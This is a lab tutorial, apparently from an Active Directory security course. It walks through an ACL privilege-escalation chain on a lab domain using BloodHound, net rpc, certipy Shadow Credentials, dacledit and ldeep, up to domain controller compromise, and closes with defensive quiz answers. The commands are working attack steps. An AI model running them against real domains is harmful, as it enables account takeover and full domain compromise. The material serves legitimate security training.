#ACLs

WAD uses ACLs in what are called object's Security Descriptors in order to define object access. These ACLs hold information on which Security Principals have what type of access to the object in question. ACLs can be exploited by attackers. For example, imagine that the attacker compromises an account A, and this account A holds determined access rights to an object B. This way, if access rights are powerful enough, the attacker may also compromise object B using account A. This is the basic principle of ACL attacks. Now, let's get to concrete examples.

We've previously gathered information and uploaded it to BloodHound on the BloodHound section. Let's query our information for ACL paths, to get a better look at what can be done. Use the following Cypher query:
```
MATCH p=(u)-[r1]->(n)
WHERE r1.isacl = true
  AND u.admincount = false
  AND NOT toLower(u.name) CONTAINS 'key'
  AND toLower(u.domain) = "north.altair.local"
  AND NOT toLower(u.name) CONTAINS 'ras and ias servers'
  AND NOT toLower(n.name) CONTAINS 'ras and ias servers'
  AND NOT toLower(u.name) CONTAINS 'samaccountname'
  AND NOT toLower(n.name) CONTAINS 'samaccountname'
RETURN p
```

This shows us different nodes and links. These nodes are our Security Principals, and the links between them represent different access rights, defined by ACLs. Through the BloodHound GUI we can determine that there's a path from the Skyler White user, all the way to the CAPTAIN machine!
First, we notice that Skyler has a 'ForceChangePassword' link to Jesse. This indicates that Skyler can change Jesse's password! Since we've compromised Skyler's account earlier, we can now compromise Jesse's by changing it's current password:
```
net rpc password jesse.pinkman -U north.altair.local/skyler.white%Password123 -S captain.north.altair.local
#introduce the password, for example ThisIsANewPassword10
#now confirm if the password was correctly altered
crackmapexec smb 192.168.122.10 -u jesse.pinkman -d north.altair.local -p ThisIsANewPassword10
```
From jesse’s account, we can compromise walter.white’s account, since jesse holds the 'GenericWrite' access right over it. This means that Jesse can alter Walter's attributes. This allows for the Shadow Credentials attack, seen in our ADCS section. We can therefore  retrieve Walter's hashes and a TGT in his name through this attack, as Jesse.
```
certipy shadow auto -u jesse.pinkman@north.altair.local -p ThisIsANewPassword10 -account 'walter.white'
```

And we've compromised Walter's account! Let's see what we can do from here. It seems Walter has the ability of modifying Hank's own ACL! This means the attacker, as Walter, can give theirself other types of access to Hank, such as 'FullControl' access! Then, we can perform the Shadow Credentials attack once more, as 'FullControl' access gives Walter (yes, you've guessed it) full control over Hank's user account! One can also change Hank's password as we've done before. I'll let you decide this one for yourself.

```
#we can check walter's current rights on hank, please use set the KRB5CCNAME env var to the .ccache file retrieved in the last step
dacledit.py -no-pass -hashes :<NT hash from previous attack> -action 'read' -principal walter.white -target 'hank.schrader' 'north.altair.local'/'walter.white'
#add FullControl right to walter
dacledit.py -no-pass -hashes :<NT hash from previous attack> -action 'write' -rights 'FullControl' -principal walter.white  -target 'hank.schrader' 'north.altair.local'/'walter.white'
#we can check walter's new access rights on hank's account
dacledit.py -no-pass -hashes :<NT hash from previous attack> -action 'read' -principal walter.white -target 'hank.schrader' 'north.altair.local'/'walter.white'
#you can use the shadow credentials attack once again, this time using walter's account and targeting hank's
certipy shadow auto -u walter.white@north.altair.local -hashes :<NT hash from previous attack> -account 'hank.schrader'
```

Once you've compromised Hank's account, you can use it to add members to the 'Masters' security group! It seems that this group has 'GenericAll' access rights over the DC!

```
# Add skyler.white to the Masters group
ldeep ldap -u hank.schrader -H ':<NT hash from previous attack>' -d north.altair.local -s ldap://192.168.122.10 add_to_group "CN=Skyler White,CN=Users,DC=north,DC=altair,DC=local" "CN=Masters,CN=Users,DC=north,DC=altair,DC=local"

#Confirm that skyler is now part of the masters group
ldeep ldap -u hank.schrader -H ':<NT hash from previous attack>' -d north.altair.local -s ldap://192.168.122.10 membersof 'Masters'
```
Now, all thanks to misconfigured ACLs with over-permissive access rights granted to low-privileged accounts,  the attacker can compromise the domain:
```
certipy shadow auto -u skyler.white@north.altair.local -p 'Password123' -account 'captain$'
#now you can use the secretsdump.py script with either the hashes or the TGT received from the shadow credentials attack
```

!!! question
    How could these permissions have been configured more securely to prevent privilege escalation through ACLs?
??? success "Answer"
    Permissions should follow the principle of least privilege. Only the minimum rights necessary should be granted. For example, avoiding giving low-privileged accounts rights like ForceChangePassword, GenericWrite, or GenericAll over higher-privileged accounts.
!!! question
    What would be the real impact on the organization if an attacker exploited this ACL chain up to the Domain Controller?
??? success "Answer"
    Full compromise of the DC effectively gives the attacker control over the entire Active Directory domain. This means the ability to impersonate any user, maintain persistent access, and more. Essentially, this is game over for the organization’s AD domain.
!!! question
    Is the BloodHound tool only helpful for attackers in this scenario?
??? success "Answer"
    No. BloodHound is valuable for both attackers and defenders. While attackers can use it to map privilege escalation paths and exploit misconfigurations, defenders can leverage it to audit AD environments, identify excessive permissions, and remediate risky ACLs before they are abused. When integrated into security audits, BloodHound becomes a powerful defensive tool.




